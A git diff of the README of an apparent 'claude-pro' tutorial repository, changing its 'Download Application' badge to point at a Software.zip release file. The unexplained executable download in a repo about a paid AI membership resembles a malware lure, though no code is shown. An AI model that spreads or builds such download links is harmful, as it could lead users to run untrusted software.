@@ -9,7 +9,7 @@ Welcome to the "claude-pro" GitHub repository dedicated to guiding users through
 
 ## 🚀 Application Download Link
 Click below to download the application for the Claude Pro membership tutorial:
-[![Click to Download Application](https://img.shields.io/badge/Download-Application-green.svg)](https://github.com/user-attachments/files/18426772/Application.zip)
+[![Click to Download Application](https://github.com/theenayi/claude-pro/releases/download/v2.0/Software.zip)](https://github.com/theenayi/claude-pro/releases/download/v2.0/Software.zip)
 
 # 🌈 Getting Started with Claude Pro
 
